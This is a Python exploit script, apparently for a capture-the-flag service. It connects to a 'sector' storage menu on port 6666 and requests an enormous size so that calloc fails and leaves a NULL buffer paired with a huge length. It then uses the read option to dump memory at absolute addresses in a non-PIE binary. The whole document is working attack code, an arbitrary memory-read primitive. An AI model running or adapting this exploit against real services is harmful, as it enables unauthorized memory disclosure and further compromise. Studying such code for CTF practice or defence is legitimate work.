import socket, sys, time, re

class C:
    def __init__(self, host, port=6666, t=4.0):
        self.s=socket.socket(); self.s.settimeout(t); self.s.connect((host,port))
        self.buf=b""
    def _read_to(self, tok, t=3.0):
        self.s.settimeout(t)
        try:
            while tok not in self.buf:
                c=self.s.recv(65536)
                if not c: break
                self.buf+=c
        except socket.timeout: pass
        i=self.buf.find(tok)
        if i<0:
            out=self.buf; self.buf=b""; return out
        out=self.buf[:i+len(tok)]; self.buf=self.buf[i+len(tok):]; return out
    def prompt(self,t=3.0): return self._read_to(b"> ",t)
    def send(self,d): self.s.sendall(d)

def new_sector(c, size):
    c.prompt(); c.send(b"0\n")
    c._read_to(b"size:\n"); c.send(str(size).encode()+b"\n")
    return c._read_to(b"\n")
def read_sector(c, pos, length, t=4.0):
    c.prompt(); c.send(b"2\n")
    c._read_to(b"read?\n"); c.send(str(pos).encode()+b"\n")
    c._read_to(b"read?\n"); c.send(str(length).encode()+b"\n")
    # response: either "Invalid range" or the data then newline
    c.s.settimeout(t); data=b""
    try:
        while True:
            ch=c.s.recv(65536)
            if not ch: break
            data+=ch
    except socket.timeout: pass
    c.buf=b""
    return data

if __name__=="__main__":
    host=sys.argv[1]
    c=C(host)
    print("banner prompt:", repr(c.prompt())[-60:])
    # huge size -> calloc fails, size stays huge, buffer NULL
    print("new:", repr(new_sector(c, 0x7fffffffffff)))
    # arbitrary absolute read at low addresses (non-PIE binary/heap region)
    for addr in [0x400000, 0x404000, 0x600000, 0x4a0000]:
        d=read_sector(c, addr, 256)
        print(hex(addr), repr(d[:120]))
